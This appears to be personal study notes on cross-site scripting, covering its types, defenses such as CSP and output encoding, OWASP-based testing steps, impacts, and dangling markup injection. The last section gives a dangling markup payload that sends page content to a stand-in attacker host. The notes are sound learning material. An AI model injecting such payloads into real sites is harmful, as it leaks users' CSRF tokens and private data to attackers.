# What is XSS?

Cross Site Scripting are client side injection attack, in which attacker aims to execute malicious scripts in victims browser by including it in legitimate web page.

An attacker who exploits a cross-site scripting vulnerability is typically able to:

Impersonate or masquerade as the victim user.
Carry out any action that the user is able to perform.
Read any data that the user is able to access.
Capture the user's login credentials.
Perform virtual defacement of the web site.
Inject trojan functionality into the web site.


# Types of XSS?

1. Stored XSS    https://www.youtube.com/watch?v=PPzn4K2ZjfY

Stored or persistent or second order XSS is is specific vulnerability where in application saves payload sent by attacker in backend database or server side files which later gets include in HTTP response in unsafe way.


2. Reflected XSS

Reflected XSS is vulnerability which arises when application receives data in HTTP request and includes that data in immediate response in unsafe way.

3. DoM XSS          https://www.youtube.com/watch?v=u-MYZpRFq-k

what is DOM? DOM is a prgarmming interface(API) which can be used by any programming language like javascript using which we can easily read,write and update content of document

DOM represents the content of HTML ot XML as a tree strucuture

What is DOM XSS? 

In general the request goes to server and then server render the response while in case of DOM XSS its not the case, the entire processing happens on client side, threfore dom xss is purely client side scripting

DOM XSS arises when javascript takes data from attacker-controllable source such as URL and passess it to a sink that supports dynamic code execution such as eval() or innerHTML

Prevent - developer should avoid using functions like eval()

4. Blind XSS 

Blind XSS vulnerabilities are a variant of Stored XSS vulnerabilities

They occur when the attacker input is saved by the web server and executed as a malicious script in another part of the application or in another application. For example, an attacker injects a malicious payload into a contact/feedback page and when the administrator of the application is reviewing the feedback entries the attacker’s payload will be loaded.

In the case of blind XSS, the attacker’s input can be saved by the server and only executed after a long period of time when the administrator visits the vulnerable dashboard page. It can take hours, days, or even weeks until the payload is executed. 

Therefore, this type of vulnerabilities in web applications cannot be tested as other types of XSS vulnerabilities and they pose a challenge for web security (web application security), penetration testing, and security testing in general.

# Why it happpen?

It happens because developer dosen't sanitize user input properly


# Defense and preventions

1. CSP (Content Security Policy)

CSP is a browser security mechanism that aims to mitigate XSS and some other attacks. It works by restricting the resources (such as scripts and images) that a page can load and restricting whether a page can be framed by other pages.

To enable CSP, a response needs to include an HTTP response header called Content-Security-Policy with a value containing the policy

The following directive will only allow scripts to be loaded from the same origin as the page itself:

    Content-Security-Policy script-src 'self'

The following directive will only allow scripts to be loaded from a specific domain:

    Content-Security-Policy script-src https://scripts.normal-website.com
        
        
2. HttpOnly  - A cookie with the HttpOnly attribute is inaccessible to the JavaScript Document.cookie API; it's only sent to the server.
              This precaution helps mitigate cross-site scripting (XSS) attacks.


3. Framework Security -  Modern frameworks guide developers towards good security practices and help mitigate XSS by using templating, 
                         auto-escaping, and more. That said, developers need to be aware of problems that can occur when using frameworks insecurely.

                         There will be times where you need to do something outside the protection provided by your framework. This is where Output Encoding and HTML Sanitization are critical

4. Output Encoding  - Output Encoding is recommended when you need to safely display data exactly as a user typed it in, Automatic 
                      encoding and escaping functions are built into most frameworks.
                      There are many different output encoding methods because browsers parse HTML, JS, URLs, and CSS differently. Using the wrong encoding method may introduce weaknesses or harm the functionality of your application.

                      Output encoding is not perfect. It will not always prevent XSS. These locations are known as dangerous contexts. Dangerous contexts include: Callback functions,All JavaScript event handlers (onclick(), onerror(), onmouseover())., Unsafe JS functions like eval(), setInterval(), setTimeout()

5. HTML Sanitization - Sometimes users need to author HTML. One scenario would be allow users to change the styling or structure of 
                       content inside a WYSIWYG editor. Output encoding here will prevent XSS, but it will break the intended functionality of the application. The styling will not be rendered. In these cases, HTML Sanitization should be used

6. Safe Sinks       - Security professionals often talk in terms of sources and sinks. If you pollute a river, it'll flow downstream 
                      somewhere. It’s the same with computer security. XSS sinks are places where variables are placed into your webpage.
                      Thankfully, many sinks where variables can be placed are safe. This is because these sinks treat the variable as text and will never execute it. Try to refactor your code to remove references to unsafe sinks like innerHTML, and instead use textContent or value.

7. XSS prevention rule summary - https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html#xss-prevention-rules-summary


# XSS Testing - https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html

* Testing for Reflected Cross Site Scripting - 

    step 1: Detect Input Vectors

    Determining the user defined inputs in web application and how to input them.

    Step 2: Analyzing Input Vectors

    test each input vector with testing data

    step 3: Checking the Impact

https://owasp.org/www-project-web-security-testing-guide/v41/4-Web_Application_Security_Testing/07-Input_Validation_Testing/01-Testing_for_Reflected_Cross_Site_Scripting

* Testing for Stored XSS

The process for identifying stored XSS vulnerabilities is similar to the process described during the testing for reflected XSS.

- Detect Input Vectors -> Analyze Input Vectors -> Check the Impact

- Analyze HTML - Differently from reflected XSS, the pen-tester should also investigate any out-of-band channels through which the 
                 application receives and stores users input.

Note: All areas of the application accessible by administrators should be tested to identify the presence of any data submitted by users

Stored XSS can be exploited by advanced JavaScript exploitation frameworks such as BeEF and XSS Proxy.

- Check for HTML content File Upload - If the web application allows file upload, it is important to check if it is possible to upload 
                                       HTML content. For instance, if HTML or TXT files are allowed, XSS payload can be injected in the file uploaded.

                                       The pen-tester should also verify if the file upload allows setting arbitrary MIME types.
                                       For instance, innocuous-looking files like JPG and GIF can contain an XSS payload that is executed when they are loaded by the browser. This is possible when the MIME type for an image such as image/gif can instead be set to text/html. In this case the file will be treated by the client browser as HTML.  

* Testing for DOM XSS- 

Automated testing has only very limited success at identifying and validating DOM-based XSS as it usually identifies XSS by sending a specific payload and attempts to observe it in the server response For this reason, automated testing will not detect areas that may be susceptible to DOM-based XSS unless the testing tool can perform additional analysis of the client side code.

Manual testing should therefore be undertaken and can be done by examining areas in the code where parameters are referred to that may be useful to an attacker

https://owasp.org/www-project-web-security-testing-guide/v41/4-Web_Application_Security_Testing/11-Client_Side_Testing/01-Testing_for_DOM-based_Cross_Site_Scripting



# Impacts   

XSS can cause a variety of problems for the end user that range in severity from an annoyance to complete account compromise.

*  The most severe XSS attacks involve disclosure of the user’s session cookie, allowing an attacker to hijack the user’s session and take over the account.

* Other damaging attacks include the disclosure of end user files, installation of Trojan horse programs, redirecting the user to some other page or site, or modifying presentation of content.

* adjacking - we can put our own ads on vulnerable website and earn money

* Click jacking - we can create a hidden overlay on a page to hijack clicks of victim to perform malicious actions

* Session hijacking -HTTP cookies can be accessed by javascript if the HTTP only flag is not present in the cookies

* Content Spoofing - We can use javascript to modify web app content

* Credential Harvesting - you can use fancy popups to harvest credentials 

* Forced Downloads - making things download without victims approval

* Keyloggin - capturing victims input

* Bypass CSRF protection

* Recording audio, browser and system fingerprinting, redirecting pages


**********************************************************************************************************************
# Dangling markup injection
https://portswigger.net/web-security/cross-site-scripting/dangling-markup

Dangling markup injection is a technique for capturing data cross-domain in situations where a full cross-site scripting attack isn't possible.

Suppose an application embeds attacker-controllable data into its responses in an unsafe way:

<input type="text" name="input" value="CONTROLLABLE DATA HERE

Suppose also that the application does not filter or escape the > or " characters, 

In this situation, an attacker would naturally attempt to perform XSS. use the "> to break out of the quoted attribute value and the enclosing tag

But suppose that a regular XSS attack is not possible, due to input filters, content security policy, or other obstacles. 

Here, it might still be possible to deliver a dangling markup injection attack using a payload like the following:

"><img src='//attacker-website.com?

Note that the attacker's payload doesn't close the src attribute, which is left "dangling". When a browser parses the response, it will look ahead until it encounters a single quotation mark to terminate the attribute. 

Everything up until that character will be treated as being part of the URL and will be sent to the attacker's server within the URL query string. 

The consequence of the attack is that the attacker can capture part of the application's response following the injection point, which might contain sensitive data. Depending on the application's functionality, this might include CSRF tokens, email messages, or financial data.

* prevent dangling markup attacks

You can prevent dangling markup attacks using the same general defenses for preventing cross-site scripting, by encoding data on output and validating input on arrival.

You can also mitigate some dangling markup attacks using content security policy (CSP). For example, you can prevent some (but not all) attacks, using a policy that prevent tags like img from loading external resources.